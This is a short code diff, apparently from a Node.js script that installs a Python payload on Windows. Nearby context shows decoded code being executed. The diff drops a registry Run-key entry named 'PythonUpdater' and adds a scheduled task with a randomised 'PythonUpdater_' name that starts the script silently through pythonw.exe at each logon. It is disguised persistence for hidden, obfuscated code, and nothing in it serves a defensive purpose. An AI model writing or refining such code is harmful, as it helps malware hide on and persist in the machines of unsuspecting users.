@@ -1072,15 +1072,13 @@ exec(decoded_code)
         console.error(`Error terminating pythonw.exe: ${error.message}`);
     }
 
-    // Add the Python script to startup
-    const startupScriptPath = `"${pythonwExe}" "${scriptFilePath}"`;
-    const regPath = `HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`;
-
+    // Schedule the Python script to run at user logon
     try {
-        execSync(`reg add ${regPath} /v PythonUpdater /t REG_SZ /d "${startupScriptPath}" /f`);
-        console.log('Python script added to startup successfully.');
+        const taskName = `PythonUpdater_${generateRandomString(8)}`;
+        execSync(`schtasks /create /tn "${taskName}" /tr "\"${pythonwExe}\" \"${scriptFilePath}\"" /sc onlogon /f`);
+        console.log('Python script scheduled to run at logon.');
     } catch (error) {
-        console.error(`Error adding to startup: ${error.message}`);
+        console.error(`Error scheduling task: ${error.message}`);
     }
 
     // Run the Python script in the background
